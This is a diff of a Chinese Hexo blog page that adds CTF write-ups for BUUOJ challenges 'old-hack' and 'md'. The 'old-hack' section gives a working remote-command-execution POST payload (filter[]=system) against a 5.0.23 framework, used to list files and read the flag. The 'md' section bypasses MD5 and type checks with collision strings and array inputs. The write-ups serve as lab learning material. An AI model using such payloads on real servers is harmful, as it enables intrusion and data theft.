@@ -29,8 +29,12 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/08/buuoj-z7z8/online1.png">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/08/buuoj-z7z8/online2.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/08/buuoj-z7z8/cve.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/08/buuoj-z7z8/cve-1.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/08/buuoj-z7z8/cve-2.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/08/buuoj-z7z8/cve-3.png">
 <meta property="article:published_time" content="2020-10-08T13:56:01.000Z">
-<meta property="article:modified_time" content="2020-10-08T14:53:57.373Z">
+<meta property="article:modified_time" content="2020-10-11T14:04:47.277Z">
 <meta property="article:author" content="sunzy">
 <meta property="article:tag" content="shell">
 <meta name="twitter:card" content="summary">
@@ -223,10 +227,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-10-08 21:56:01 / 修改时间：22:53:57" itemprop="dateCreated datePublished" datetime="2020-10-08T21:56:01+08:00">2020-10-08</time>
+              <time title="创建时间：2020-10-08 21:56:01" itemprop="dateCreated datePublished" datetime="2020-10-08T21:56:01+08:00">2020-10-08</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-11 22:04:47" itemprop="dateModified" datetime="2020-10-11T22:04:47+08:00">2020-10-11</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -264,7 +274,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.6k</span>
+              <span>4.5k</span>
             </span>
 
         </div>
@@ -327,6 +337,34 @@
 <p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p>
 <p><a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p>
 <p>(写的有点乱)</p>
+<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>打开页面出现了提示</p>
+<p><img src="/2020/10/08/buuoj-z7z8/cve.png" alt></p>
+<p>这里应该是php5的漏洞利用，和攻防世界的一道题比较像<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5412&page=1" target="_blank" rel="noopener">传送门</a></p>
+<p>先看看报错信息:1 <code>url+?s=1</code></p>
+<p><img src="/2020/10/08/buuoj-z7z8/cve-1.png" alt></p>
+<p>php版本为5.0.23，上网搜了一下这版本的漏洞</p>
+<p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p>
+<p>直接构造payload，读取目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url</span><br><span class="line">POST:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls &#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/08/buuoj-z7z8/cve-2.png" alt></p>
+<p>看到了flag文件</p>
+<p>读取flag</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url</span><br><span class="line"><span class="symbol">POST:</span>_method=__construct<span class="variable">&amp;filter</span>[]=system<span class="variable">&amp;server</span>[REQUEST_METHOD]=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/08/buuoj-z7z8/cve-3.png" alt></p>
+<h2 id="md"><a href="#md" class="headerlink" title="md"></a>md</h2><p><code>I put something in F12 for you</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">	$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">	$gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">	<span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">			$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">			<span class="keyword">if</span> (!is_numeric($passwd)) &#123;</span><br><span class="line">				<span class="keyword">if</span>($passwd==<span class="number">1234567</span>) &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">					highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先F12找一找提示，原来就是格式化好的源码</p>
+<p><code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</code></p>
+<p>直接使用数组绕过，也可以使用md5强碰撞的两字符串</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">param<span class="number">1</span>=M<span class="symbol">%C9h</span><span class="symbol">%FF</span><span class="symbol">%0</span>E<span class="symbol">%E3</span><span class="symbol">%5</span>C<span class="symbol">%20</span><span class="symbol">%95</span>r<span class="symbol">%D4w</span><span class="symbol">%7</span>Br<span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%D3o</span><span class="symbol">%A7</span><span class="symbol">%B2</span><span class="symbol">%1</span>B<span class="symbol">%DCV</span><span class="symbol">%B7J</span><span class="symbol">%3</span>D<span class="symbol">%C0x</span><span class="symbol">%3</span>E<span class="symbol">%7</span>B<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%AF</span><span class="symbol">%BF</span><span class="symbol">%A2</span><span class="symbol">%00</span><span class="symbol">%A8</span><span class="symbol">%28</span>K<span class="symbol">%F3n</span><span class="symbol">%8</span>EKU<span class="symbol">%B3_Bu</span><span class="symbol">%93</span><span class="symbol">%D8Igm</span><span class="symbol">%A0</span><span class="symbol">%D1U</span><span class="symbol">%5</span>D<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%FB_</span><span class="symbol">%07</span><span class="symbol">%FE</span><span class="symbol">%A2</span></span><br><span class="line">param<span class="number">2</span>=M<span class="symbol">%C9h</span><span class="symbol">%FF</span><span class="symbol">%0</span>E<span class="symbol">%E3</span><span class="symbol">%5</span>C<span class="symbol">%20</span><span class="symbol">%95</span>r<span class="symbol">%D4w</span><span class="symbol">%7</span>Br<span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%D3o</span><span class="symbol">%A7</span><span class="symbol">%B2</span><span class="symbol">%1</span>B<span class="symbol">%DCV</span><span class="symbol">%B7J</span><span class="symbol">%3</span>D<span class="symbol">%C0x</span><span class="symbol">%3</span>E<span class="symbol">%7</span>B<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%AF</span><span class="symbol">%BF</span><span class="symbol">%A2</span><span class="symbol">%02</span><span class="symbol">%A8</span><span class="symbol">%28</span>K<span class="symbol">%F3n</span><span class="symbol">%8</span>EKU<span class="symbol">%B3_Bu</span><span class="symbol">%93</span><span class="symbol">%D8Igm</span><span class="symbol">%A0</span><span class="symbol">%D1</span><span class="symbol">%D5</span><span class="symbol">%5</span>D<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%FB_</span><span class="symbol">%07</span><span class="symbol">%FE</span><span class="symbol">%A2</span></span><br></pre></td></tr></table></figure>
+
+<p><code>if (!is_numeric($passwd))</code>弱类型比较，使用1234567a绕过</p>
+<p>payload:</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">?id</span>=M<span class="meta">%C9h</span><span class="meta">%FF</span><span class="meta">%0E</span><span class="meta">%E3</span><span class="meta">%5C</span><span class="meta">%20</span><span class="meta">%95r</span><span class="meta">%D4w</span><span class="meta">%7Br</span><span class="meta">%15</span><span class="meta">%87</span><span class="meta">%D3o</span><span class="meta">%A7</span><span class="meta">%B2</span><span class="meta">%1B</span><span class="meta">%DCV</span><span class="meta">%B7J</span><span class="meta">%3D</span><span class="meta">%C0x</span><span class="meta">%3E</span><span class="meta">%7B</span><span class="meta">%95</span><span class="meta">%18</span><span class="meta">%AF</span><span class="meta">%BF</span><span class="meta">%A2</span><span class="meta">%00</span><span class="meta">%A8</span><span class="meta">%28K</span><span class="meta">%F3n</span><span class="meta">%8EKU</span><span class="meta">%B3_Bu</span><span class="meta">%93</span><span class="meta">%D8Igm</span><span class="meta">%A0</span><span class="meta">%D1U</span><span class="meta">%5D</span><span class="meta">%83</span><span class="meta">%60</span><span class="meta">%FB_</span><span class="meta">%07</span><span class="meta">%FE</span><span class="meta">%A2</span>&amp;gg=M<span class="meta">%C9h</span><span class="meta">%FF</span><span class="meta">%0E</span><span class="meta">%E3</span><span class="meta">%5C</span><span class="meta">%20</span><span class="meta">%95r</span><span class="meta">%D4w</span><span class="meta">%7Br</span><span class="meta">%15</span><span class="meta">%87</span><span class="meta">%D3o</span><span class="meta">%A7</span><span class="meta">%B2</span><span class="meta">%1B</span><span class="meta">%DCV</span><span class="meta">%B7J</span><span class="meta">%3D</span><span class="meta">%C0x</span><span class="meta">%3E</span><span class="meta">%7B</span><span class="meta">%95</span><span class="meta">%18</span><span class="meta">%AF</span><span class="meta">%BF</span><span class="meta">%A2</span><span class="meta">%02</span><span class="meta">%A8</span><span class="meta">%28K</span><span class="meta">%F3n</span><span class="meta">%8EKU</span><span class="meta">%B3_Bu</span><span class="meta">%93</span><span class="meta">%D8Igm</span><span class="meta">%A0</span><span class="meta">%D1</span><span class="meta">%D5</span><span class="meta">%5D</span><span class="meta">%83</span><span class="meta">%60</span><span class="meta">%FB_</span><span class="meta">%07</span><span class="meta">%FE</span><span class="meta">%A2</span></span><br><span class="line"></span><br><span class="line">POST:passwd=<span class="number">1234567</span>a</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"><span class="built_in">?id</span>[]=<span class="number">1</span>&amp;gg[]=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">POST:passwd=<span class="number">1234567</span>a</span><br></pre></td></tr></table></figure>
+
 
     </div>
     <div>
@@ -363,8 +401,9 @@
 
 
       <footer class="post-footer">
+          
           <div class="post-tags">
-              <a href="/tags/shell/" rel="tag"># shell</a>
+              <a href="/tags/shell/" rel="tag"><i class="fa fa-tag"></i> shell</a>
           </div>
 
         
@@ -436,7 +475,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#buuoj–杂七杂八"><span class="nav-number">1.</span> <span class="nav-text">buuoj–杂七杂八</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-2018-Online-Tool"><span class="nav-number">1.1.</span> <span class="nav-text">[BUUCTF 2018]Online Tool</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#buuoj–杂七杂八"><span class="nav-number">1.</span> <span class="nav-text">buuoj–杂七杂八</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-2018-Online-Tool"><span class="nav-number">1.1.</span> <span class="nav-text">[BUUCTF 2018]Online Tool</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-old-hack"><span class="nav-number">1.2.</span> <span class="nav-text">[BJDCTF 2nd]old-hack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#md"><span class="nav-number">1.3.</span> <span class="nav-text">md</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -472,10 +511,10 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/sunzhengyu99" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;sunzhengyu99" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+        <a href="https://github.com/sunzhengyu99" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;sunzhengyu99" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
       </span>
       <span class="links-of-author-item">
-        <a href="mailto:2632338423@qq.com" title="E-Mail → mailto:2632338423@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+        <a href="mailto:2632338423@qq.com" title="E-Mail → mailto:2632338423@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
       </span>
   </div>
   <div class="cc-license motion-element" itemprop="license">
@@ -533,7 +572,7 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">69k</span>
+    <span title="站点总字数">71k</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
